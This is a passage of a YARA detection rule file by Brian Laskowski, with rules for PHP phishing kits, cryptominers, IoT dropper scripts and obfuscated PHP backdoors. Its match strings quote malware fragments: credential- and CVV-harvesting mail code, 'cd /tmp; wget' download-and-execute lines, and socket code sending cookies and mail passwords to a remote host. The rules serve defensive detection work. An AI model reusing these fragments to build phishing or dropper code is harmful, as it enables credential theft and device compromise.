      $s3 = "$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";" fullword ascii
      $s4 = "$message .= \"Password : \".$_POST['pass'].\"\\n\";" fullword ascii
      $s5 = "$message .= \"-----------  ! +nJoY+ !  -----------\\n\";" fullword ascii
      $s6 = "$message .= \"Email : \".$_POST['userid'].\"\\n\";" fullword ascii
      //$s7 = "$send = \"herren.ruth@gmail.com\";" fullword ascii
      $s8 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s9 = "header(\"Location: complete.php\");" fullword ascii
      $s10 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s11 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s12 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s13 = "$message .= \"IP Address : \".$ip.\"\\n\";" fullword ascii
      $s14 = "$message .= \"CVV : \".$_POST['card_code'].\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule hostname_quotaview_incoming_microsoft_phish {
   meta:
      description = "microsoft-phish - file hostname.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-11"
      hash1 = "b81fb37dc48812f6ad61984ecf2a8dbbfe581120257cb4becad5375a12e755bb"
   strings:
      $s1 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname" fullword ascii
      $s2 = "* hostname.php" fullword ascii
      $s3 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s4 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s5 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule quotaview_incoming_microsoft_phish_index {
   meta:
      description = "microsoft-phish - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-11"
      hash1 = "bec638fbc9edfbd8e65ee9dec04b921d12eb51a7cfd2862c348b4780b729b500"
   strings:
      $s1 = "header(\"location: login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga\");" fullword ascii
      $s2 = "require_once 'hostname.php';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}



/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-17
   Identifier: script
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_17_18_microsoft_phishing {
   meta:
      description = "script - file throwit.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-17"
      hash1 = "58aa21f585268e84641601ad644f22de57b363c813005efbd63fe29f58cc3ac6"
   strings:
      $s1 = "header(\"Location: http://login.microsoftonline.com\");" fullword ascii
      $s2 = "$ip_data = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ip));" fullword ascii
      $s3 = "$message .= \"PASS 2: \".$_POST['password2'].\"\\n\";" fullword ascii
      $s4 = "$message .= \"PASS 1: \".$_POST['password'].\"\\n\";" fullword ascii
      $s5 = "$headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";" fullword ascii
      $s6 = "$sent" fullword ascii
      $s7 = "$message .= \"EMAIL: \".$_POST['username'].\"\\n\";" fullword ascii
      $s8 = "$handle = fopen(\"script.txt\", \"a\");" fullword ascii
      $s9 = "$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii
      $s10 = "$headers = \"MIME-Version: 1.0\" . \"\\r\\n\";" fullword ascii
      $s11 = "$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);" fullword ascii
      $s12 = "$subject = \"REMITTANCE - \";" fullword ascii
      $s13 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s14 = "$headers = \"From: SCRIPT>\";" fullword ascii
      $s15 = "elseif(filter_var($forward, FILTER_VALIDATE_IP))" fullword ascii
      $s16 = "$message .= \"---------=IP Address & Date=---------\\n\";" fullword ascii
      $s17 = "// Function to get country and country sort;" fullword ascii
      $s18 = "mail($mesaegs,$subject,$message,$headers);" fullword ascii
      $s19 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s20 = "mail($sent,$subject,$message,$headers);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 5KB and
         ( 8 of them )
      ) or ( all of them )
}
rule crypto_miner_config_file_0
{
	meta: 
	author= "Brian Laskowski"
	info= " Detected a cryptomining config file"

	strings:
		$m = "pool_address"
		$m1 = "wallet_address"
		$m2 = "pool_password"
		$m3 = "pool_weight"
	
	condition:
		all of them
}

rule crypto_miner
{
	meta: 
	author= "Brian Laskowski"
	info= " Detected a cryptomining exe"

	strings:
		$miner = "stratum+tcp"
	
	condition:
		$miner
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-20
   Identifier: scripts
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_20_18_scripts_dlink {
   meta:
      description = "scripts - file dlink"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-20"
      hash1 = "ea5cee148f7cbeb3eb4553b7fc2315c48873acb8322e412a344574e70c5f4e4c"
   strings:
      $x1 = "cd /tmp; wget"
      $x3 = "; chmod 777 sefa.mips; ./sefa.mips dlink.mips; rm -rf sefa.mips" fullword ascii
      $x2 = "cd /tmp; wget"
      $x4 = "; chmod 777 sefa.mpsl; ./sefa.mpsl dlink.mpsl; rm -rf sefa.mpsl" fullword ascii
   condition:
      ( uint16(0) == 0x6463 and
         filesize < 1KB and
         ( 1 of ($x*) )
      ) or ( all of them )
}

rule infected_10_20_18_scripts_avtech {
   meta:
      description = "scripts - file avtech"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-20"
      hash1 = "4459ec5c40bd6bed326080ac388eb0c78e74fbc73b2bea7d4b948a2e4c6dea53"
   strings:
      $x1 = "cd /tmp; wget"
      $x2 = "; chmod 777 sefa.arm; ./sefa.arm avtech.arm; rm -rf sefa.arm" fullword ascii
   condition:
      ( uint16(0) == 0x6463 and
         filesize < 1KB and
         ( 1 of ($x*) )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-22
   Identifier: miner-exe
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_22_18_miner_miner_exe_p {
   meta:
      description = "miner-exe - file p"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017"
   strings:
      $x1 = "{\"method\": \"login\", \"params\": {\"login\": \"%s\", \"pass\": \"%s\", \"agent\": \"cpuminer-multi/0.1\"}, \"id\": 1}" fullword ascii
      $s2 = "(-(e)) != 35 || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii
      $s3 = "s->d1->w_msg_hdr.msg_len + ((s->version == DTLS1_VERSION) ? DTLS1_CCS_HEADER_LENGTH : 3) == (unsigned int)s->init_num" fullword ascii
      $s4 = "Rewinding stream by : %d bytes on url %s (size = %lld, maxdownload = %lld, bytecount = %lld, nread = %d)" fullword ascii
      $s5 = "((mutex)->__data.__kind & 127) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s6 = "*(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t))" fullword ascii
      $s7 = "-x, --proxy=[PROTOCOL://]HOST[:PORT]  connect through a proxy" fullword ascii
      $s8 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s9 = "(mutex->__data.__kind & PTHREAD_MUTEX_ROBUST_NORMAL_NP) == 0" fullword ascii
      $s10 = "(mutex->__data.__kind & PTHREAD_MUTEX_PRIO_INHERIT_NP) != 0" fullword ascii
      $s11 = "compiler: gcc -I. -I.. -I../include  -DOPENSSL_THREADS -D_REENTRANT -DDSO_DLFCN -DHAVE_DLFCN_H -m64 -DL_ENDIAN -DTERMIO -g -O2 -" ascii
      $s12 = "* (4 * 1024 * 1024 * sizeof(long))) - 1)))->ar_ptr : &main_arena)" fullword ascii
      $s13 = "-P, --protocol-dump   verbose dump of protocol-level activities" fullword ascii
      $s14 = "TLS generation counter wrapped!  Please report as described in <http://www.debian.org/Bugs/>." fullword ascii
      $s15 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s16 = "*** Error in `%s': %s: 0x%s ***" fullword ascii
      $s17 = "== 1) ? __builtin_strcmp (&zone_names[info->idx], __tzname[tp->tm_isdst]) : (- (__extension__ ({ const unsigned char *__s2 = (c" fullword ascii
      $s18 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s19 = "FTP: login denied" fullword ascii
      $s20 = "__pthread_mutex_cond_lock_adjust" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 9000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_22_18_miner_miner_exe_s {
   meta:
      description = "miner-exe - file s"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "1fd02c046f386f0c8779cef3d207613f3ecaa1aac27b88d0898fa145f584dc22"
   strings:
      $x1 = "{\"method\": \"login\", \"params\": {\"login\": \"%s\", \"pass\": \"%s\", \"agent\": \"cpuminer-multi/0.1\"}, \"id\": 1}" fullword ascii
      $s2 = "-x, --proxy=[PROTOCOL://]HOST[:PORT]  connect through a proxy" fullword ascii
      $s3 = "-P, --protocol-dump   verbose dump of protocol-level activities" fullword ascii
      $s4 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s5 = "{\"method\": \"submit\", \"params\": {\"id\": \"%s\", \"job_id\": \"%s\", \"nonce\": \"%s\", \"result\": \"%s\"}, \"id\":1}" fullword ascii
      $s6 = "hash > target (false positive)" fullword ascii
      $s7 = "User-Agent: cpuminer/2.3.3" fullword ascii
      $s8 = "{\"method\": \"getjob\", \"params\": {\"id\": \"%s\"}, \"id\":1}" fullword ascii
      $s9 = "{\"method\": \"getwork\", \"params\": [ \"%s\" ], \"id\":1}" fullword ascii
      $s10 = "rpc2_login_decode" fullword ascii
      $s11 = "getwork failed, retry after %d seconds" fullword ascii
      $s12 = "Failed to call rpc command after %i tries" fullword ascii
      $s13 = "Failed to get Stratum session id" fullword ascii
      $s14 = "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"%s\", \"%s\"]}" fullword ascii
      $s15 = "hash <= target" fullword ascii
      $s16 = "-O, --userpass=U:P    username:password pair for mining server" fullword ascii
      $s17 = "{\"method\": \"mining.submit\", \"params\": [\"%s\", \"%s\", \"%s\", \"%s\", \"%s\"], \"id\":4}" fullword ascii
      $s18 = "-S, --syslog          use system log for output messages" fullword ascii
      $s19 = "%s: unsupported non-option argument '%s'" fullword ascii
      $s20 = "Skein1024_Process_Block" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 700KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_22_18_miner_miner_exe_m {
   meta:
      description = "miner-exe - file m"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "c3ef8a6eb848c99b8239af46b46376193388c6e5fe55980d00f65818dba0b047"
   strings:
      $x1 = "{\"method\": \"login\", \"params\": {\"login\": \"%s\", \"pass\": \"%s\", \"agent\": \"cpuminer-multi/0.1\"}, \"id\": 1}" fullword ascii
      $s2 = "-x, --proxy=[PROTOCOL://]HOST[:PORT]  connect through a proxy" fullword ascii
      $s3 = "-P, --protocol-dump   verbose dump of protocol-level activities" fullword ascii
      $s4 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s5 = "pthread_mutex_unlock@@GLIBC_2.2.5" fullword ascii
      $s6 = "pthread_mutex_destroy@@GLIBC_2.2.5" fullword ascii
      $s7 = "{\"method\": \"submit\", \"params\": {\"id\": \"%s\", \"job_id\": \"%s\", \"nonce\": \"%s\", \"result\": \"%s\"}, \"id\":1}" fullword ascii
      $s8 = "pthread_mutex_lock@@GLIBC_2.2.5" fullword ascii
      $s9 = "pthread_mutex_init@@GLIBC_2.2.5" fullword ascii
      $s10 = "hash > target (false positive)" fullword ascii
      $s11 = "User-Agent: cpuminer/2.3.3" fullword ascii
      $s12 = "{\"method\": \"getjob\", \"params\": {\"id\": \"%s\"}, \"id\":1}" fullword ascii
      $s13 = "{\"method\": \"getwork\", \"params\": [ \"%s\" ], \"id\":1}" fullword ascii
      $s14 = "rpc2_login_decode" fullword ascii
      $s15 = "getwork failed, retry after %d seconds" fullword ascii
      $s16 = "Failed to call rpc command after %i tries" fullword ascii
      $s17 = "Failed to get Stratum session id" fullword ascii
      $s18 = "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"%s\", \"%s\"]}" fullword ascii
      $s19 = "hash <= target" fullword ascii
      $s20 = "-O, --userpass=U:P    username:password pair for mining server" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 500KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_22_18_miner_miner_exe_g {
   meta:
      description = "miner-exe - file g"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "7fe9d6d8b9390020862ca7dc9e69c1e2b676db5898e4bfad51d66250e9af3eaf"
   strings:
      $s1 = "XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002" fullword ascii
      $s2 = "Example: %s -s \"klogd -m 0\" -d -p test.pid ./egg bot.conf" fullword ascii
      $s3 = "+ 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) && (__s2_len = __builtin_strlen (__tzname[tp->tm_isdst]), __s2_len " fullword ascii
      $s4 = "= (__s1[2] - ((__const unsigned char *) (__const char *) (__tzname[tp->tm_isdst]))[2]); if (__s2_len > 2 && __result == 0) __re" fullword ascii
      $s5 = "ize_t))) - 1)) & ~((2 * (sizeof(size_t))) - 1))) && ((old_top)->size & 0x1) && ((unsigned long)old_end & pagemask) == 0)" fullword ascii
      $s6 = "(((unsigned long)(((void*)((char*)(p) + 2*(sizeof(size_t))))) & ((2 * (sizeof(size_t))) - 1)) == 0)" fullword ascii
      $s7 = "((unsigned long)((void*)((char*)(brk) + 2*(sizeof(size_t)))) & ((2 * (sizeof(size_t))) - 1)) == 0" fullword ascii
      $s8 = "TLS generation counter wrapped!  Please report as described in <http://www.debian.org/Bugs/>." fullword ascii
      $s9 = "- ((__const unsigned char *) (__const char *) (__tzname[tp->tm_isdst]))[0]; if (__s2_len > 0 && __result == 0) { __result = (__" fullword ascii
      $s10 = "((size_t)((void*)((char*)(mm) + 2*(sizeof(size_t)))) & ((2 * (sizeof(size_t))) - 1)) == 0" fullword ascii
      $s11 = "Fake name process" fullword ascii
      $s12 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii
      $s13 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii
      $s14 = "relocation processing: %s%s" fullword ascii
      $s15 = "ELF load command address/offset not properly aligned" fullword ascii
      $s16 = "version == ((void *)0) || (flags & ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0" fullword ascii
      $s17 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
      $s18 = "__pthread_mutex_lock" fullword ascii
      $s19 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 16384 - 3) / 4" fullword ascii
      $s20 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 1024 - 3) / 4" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 2000KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_22_18_miner_miner_exe_f {
   meta:
      description = "miner-exe - file f"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "45ed59d5b27d22567d91a65623d3b7f11726f55b497c383bc2d8d330e5e17161"
   strings:
      $s1 = "XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002" fullword ascii
      $s2 = "Example: %s -s \"klogd -m 0\" -d -p test.pid ./egg bot.conf" fullword ascii
      $s3 = "Fake name process" fullword ascii
      $s4 = "Couldn't execute" fullword ascii
      $s5 = "==> Fakename: %s PidNum: %d" fullword ascii
      $s6 = "execv@@GLIBC_2.0" fullword ascii
      $s7 = "Error: /dev/null" fullword ascii
      $s8 = "getpwnam" fullword ascii
      $s9 = "<command line>" fullword ascii
      $s10 = "getgrnam" fullword ascii
      $s11 = "Change UID/GID, use another user (optional)" fullword ascii
      $s12 = "/usr/src/packages/BUILD/glibc-2.3/cc/config.h" fullword ascii
      $s13 = "__i686.get_pc_thunk.bx" fullword ascii
      $s14 = ".gnu.version" fullword ascii
      $s15 = ".gnu.version_r" fullword ascii
      $s16 = "getenv@@GLIBC_2.0" fullword ascii
      $s17 = "getpid@@GLIBC_2.0" fullword ascii
      $s18 = "getcwd@@GLIBC_2.0" fullword ascii
      $s19 = "getgrnam@@GLIBC_2.0" fullword ascii
      $s20 = "getpwnam@@GLIBC_2.0" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule miner_g_p_0 {
   meta:
      description = "miner-exe - from files g, p"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "7fe9d6d8b9390020862ca7dc9e69c1e2b676db5898e4bfad51d66250e9af3eaf"
      hash2 = "63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017"
   strings:
      $s1 = "TLS generation counter wrapped!  Please report as described in <http://www.debian.org/Bugs/>." fullword ascii
      $s2 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii
      $s3 = "relocation processing: %s%s" fullword ascii
      $s4 = "ELF load command address/offset not properly aligned" fullword ascii
      $s5 = "version == ((void *)0) || (flags & ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0" fullword ascii
      $s6 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
      $s7 = "__pthread_mutex_lock" fullword ascii
      $s8 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 16384 - 3) / 4" fullword ascii
      $s9 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 1024 - 3) / 4" fullword ascii
      $s10 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-1021) - 53) / 4" fullword ascii
      $s11 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-125) - 24) / 4" fullword ascii
      $s12 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-16381) - 64) / 4" fullword ascii
      $s13 = "headmap.len == archive_stat.st_size" fullword ascii
      $s14 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 4932 - 1)" fullword ascii
      $s15 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 38 - 1)" fullword ascii
      $s16 = "lead_zero <= (uintmax_t) ((9223372036854775807L) - 308 - 1)" fullword ascii
      $s17 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-307) - 53)" fullword ascii
      $s18 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-4931) - 64)" fullword ascii
      $s19 = "int_no <= (uintmax_t) ((9223372036854775807L) + (-37) - 24)" fullword ascii
      $s20 = "(char *) ((void*)((char*)(p) + 2*(sizeof(size_t)))) + 4 * (sizeof(size_t)) <= paligned_mem" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule miner_s_m_1 {
   meta:
      description = "miner-exe - from files s, m"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "1fd02c046f386f0c8779cef3d207613f3ecaa1aac27b88d0898fa145f584dc22"
      hash2 = "c3ef8a6eb848c99b8239af46b46376193388c6e5fe55980d00f65818dba0b047"
   strings:
      $s1 = "hash > target (false positive)" fullword ascii
      $s2 = "rpc2_login_decode" fullword ascii
      $s3 = "hash <= target" fullword ascii
      $s4 = "Skein1024_Process_Block" fullword ascii
      $s5 = "Skein_512_Process_Block" fullword ascii
      $s6 = "Skein_256_Process_Block" fullword ascii
      $s7 = "[X]^WTQRC@EFOLIJkhmngdabspuv" fullword ascii /* reversed goodware string 'vupsbadgnmhkJILOFE@CRQTW^]X[' */
      $s8 = "|yz;8=>7412# %&/,)*" fullword ascii /* reversed goodware string '*),/&% #2147>=8;zy|' */
      $s9 = "dump_to_strbuffer" fullword ascii
      $s10 = "rpc2_login_lock" fullword ascii
      $s11 = "rpc2_login" fullword ascii
      $s12 = "num_processors" fullword ascii
      $s13 = "Target: %s" fullword ascii
      $s14 = "json_dump_file" fullword ascii
      $s15 = "dump_string" fullword ascii
      $s16 = "|ungXQJC4=&/" fullword ascii /* reversed goodware string '/&=4CJQXgnu|' */
      $s17 = "rpc2_target" fullword ascii
      $s18 = "AO]Sywek1?-#" fullword ascii /* reversed goodware string '#-?1kewyS]OA' */
      $s19 = "dump_to_file" fullword ascii
      $s20 = "diff_to_target" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule miner_s_m_p_2 {
   meta:
      description = "miner-exe - from files s, m, p"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "1fd02c046f386f0c8779cef3d207613f3ecaa1aac27b88d0898fa145f584dc22"
      hash2 = "c3ef8a6eb848c99b8239af46b46376193388c6e5fe55980d00f65818dba0b047"
      hash3 = "63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017"
   strings:
      $x1 = "{\"method\": \"login\", \"params\": {\"login\": \"%s\", \"pass\": \"%s\", \"agent\": \"cpuminer-multi/0.1\"}, \"id\": 1}" fullword ascii
      $s2 = "-x, --proxy=[PROTOCOL://]HOST[:PORT]  connect through a proxy" fullword ascii
      $s3 = "-P, --protocol-dump   verbose dump of protocol-level activities" fullword ascii
      $s4 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s5 = "{\"method\": \"submit\", \"params\": {\"id\": \"%s\", \"job_id\": \"%s\", \"nonce\": \"%s\", \"result\": \"%s\"}, \"id\":1}" fullword ascii
      $s6 = "User-Agent: cpuminer/2.3.3" fullword ascii
      $s7 = "{\"method\": \"getjob\", \"params\": {\"id\": \"%s\"}, \"id\":1}" fullword ascii
      $s8 = "{\"method\": \"getwork\", \"params\": [ \"%s\" ], \"id\":1}" fullword ascii
      $s9 = "getwork failed, retry after %d seconds" fullword ascii
      $s10 = "Failed to call rpc command after %i tries" fullword ascii
      $s11 = "Failed to get Stratum session id" fullword ascii
      $s12 = "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"%s\", \"%s\"]}" fullword ascii
      $s13 = "-O, --userpass=U:P    username:password pair for mining server" fullword ascii
      $s14 = "-S, --syslog          use system log for output messages" fullword ascii
      $s15 = "{\"method\": \"mining.submit\", \"params\": [\"%s\", \"%s\", \"%s\", \"%s\", \"%s\"], \"id\":4}" fullword ascii
      $s16 = "%s: unsupported non-option argument '%s'" fullword ascii
      $s17 = "-p, --pass=PASSWORD   password for mining server" fullword ascii
      $s18 = "client.get_version" fullword ascii
      $s19 = "Tried to call rpc2 command before authentication" fullword ascii
      $s20 = "-s, --scantime=N      upper bound on time spent scanning current work when" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 9000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


/*
   YARA Rule Set
   Author: Brian Laskowski
   Date: 2020-07-23
   Identifier: Navy
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule wp_class_datlib {
   meta:
      description = "Navy - file wp_class_datlib.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "0ae7aa610ff4eace91d6a6d3130ad6133512f2d13554f25cfd0dec11c0c44cc0"
   strings:
      $s1 = "function T_($Bc) { $x2 = 256; $W2 = 8; $cY = array(); $I3 = 0; $C4 = 0; for ($bs = 0; $bs < strlen($Bc); $bs++) { $I3 = ($I3 << " ascii
      $s2 = "3JHLvKSvgGPIPE9yAGXLKa3J/GJSfL3H5SfMNknHXLh/3MtnvKtyAGfNnLfN4GfOKymz3MXLnQPP" fullword ascii
      $s3 = "$PASS=\"188162e90b88271030885b3bd7cfd523\";" fullword ascii
      $s4 = "HXXaC8fYfTPYzk6ZRWvW3Zjj/UXRfMfQ/aIEHaYhHXXcna/S/bJQSXaRiZfT3W/cHPYgLi/P3Ujb" fullword ascii
      $s5 = "8) + ord($Bc[$bs]); $C4 += 8; if ($C4 >= $W2) { $C4 -= $W2; $cY[] = $I3 >> $C4; $I3 &= (1 << $C4) - 1; $x2++; if ($x2 >> $W2) { " ascii
      $s6 = "4z8hbhSyUt2e4D8QKEz4I1RC/o2BCTlGms+0V6HI3m+TcEgEu+ltq8aANI2x16ijoGGeT2wOAV6J" fullword ascii
      $s7 = "Azgc4tP/IHCelOP0CDxTP1uayJJQLDotAlP4HF7Ha5i0DdAFP3k5k5gLuTo05zPezuU/xQTTk05w" fullword ascii
      $s8 = "QnE9sr0fZFYQsLOG45h+RWREbgHx4TEelsyelFlR+KjKujjtwYqsRRWRLPDGwVUWItQxYw7dFkRI" fullword ascii
      $s9 = "NqCiZF5aDChQpgISAwhpeRqMwZG4C6DADu0KDClwIoDFkiqrqaBkVWp0cUDTgFWNDkp4chvscINf" fullword ascii
      $s10 = "8DNKkkKJxiAxgsp34XcMpzzzQdooD5KlnMDj6I+Wh/JH2AxnvAK2EDljwBICMHWEk6DQspyDW+YP" fullword ascii
      $s11 = "So2jvQ3oAKFiKAbgPeBfwD6kE438GGWl0q7I08YU2l+3qY224MYyNFuG3HE+ItiAREYe4MXGTGTB" fullword ascii
      $s12 = "ROE9ylT+gBf2R5TdjOsPY7imMEh09khkvZROB2W6edUgwwUYBcHwElx/iM2I6qZyJ3Gkfo+BPMXF" fullword ascii
      $s13 = "QM46xtrz66sVLGQMivL0QGAEsJQPEB628ibqMioHaDkCMECqUV75KxBBI4UN0hjuqCoMorRcsh0J" fullword ascii
      $s14 = "NTbV21hEkBeFk9JDKxsWodhLpL8qnvLXTFMuHR0NZmscmD+FJhXrHuFZhXVows0RXatK3St1KSJQ" fullword ascii
      $s15 = "7FunwaP7COmvsWi2ofDn5L/SwwKR6nIpznp6M+qYZaHeOefrHAJIOHrP4vIODaQGBj2x/SM1jqQh" fullword ascii
      $s16 = "IMRqbpkUonrCnjU3T4DJJ/sGZaaOcomzMXD41dEeSPKnpfXO6ogY1YgdV8rx11j9OjM5SrpmRIKk" fullword ascii
      $s17 = "Y5oHUY8X7M8aLeYGMNkDa9y2S2kYa263LrAGQGoGQM0FypMK0L8JTrpwrr63rxQMzD8RhBIN8aMZ" fullword ascii
      $s18 = "gNykKVYHtBjHYMoFIH86EO9gFd1bINlbdjRJiooL4KIKoJ4KgIoh1ethtfFaBSdiQE9iliwOVjFg" fullword ascii
      $s19 = "g0X6zLC5c+wPTZsFa8deeSjXrVH1ta3Jb+t6xGrLCwZysOxK8Cmd+ncTsi5OdEIDkEEDwlSi5ckp" fullword ascii
      $s20 = "aZBrCS+UyKUitay2JyQVCoUC+VbUUi+QSORScVBOXRTO4AIIFBINCBIXyGTyeSySRS3ZbPibvbSl" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule new_vvm3 {
   meta:
      description = "Navy - file new_vvm3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-07-23"
      hash1 = "bee462cb420ca448709a68defec6d2e200d717019dfe9315bd8f06ed5f7c756a"
   strings:
      $s1 = "if (!socket_connect($socket, $hp[0], $hp[1])){socket_close($socket);}else{socket_write($socket, \"GET http://\".$sd.\"/post.php " ascii
      $s2 = "socket_write($socket, \"GET http://\".$sd.\"/cpost.php HTTP/1.1\\r\\nHost: \".$host[0].\"\\r\\nCookie: \".$data.\"\\r\\n\\r\\n\"" ascii
      $s3 = "socket_write($socket, \"GET http://\".$sd.\"/cpost.php HTTP/1.1\\r\\nHost: \".$host[0].\"\\r\\nCookie: \".$data.\"\\r\\n\\r\\n\"" ascii
      $s4 = "if(empty($hostname)) return;$exec='nslookup -type=MX '.escapeshellarg($hostname);@exec($exec,$output);if(empty($output)) return;" ascii
      $s5 = "if(empty($hostname)) return;$exec='nslookup -type=MX '.escapeshellarg($hostname);@exec($exec,$output);if(empty($output)) return;" ascii
      $s6 = "fputs($fp,base64_encode($mail.\" \".hash_hmac('MD5', base64_decode(substr($authchal, 4)) ,$pass)).\"\\r\\n\");$code = substr(get" ascii
      $s7 = "post_mch($sd,'OK',$rel.';||'.$host.'||'.$port.'||'.$mail.'||'.$pass);" fullword ascii
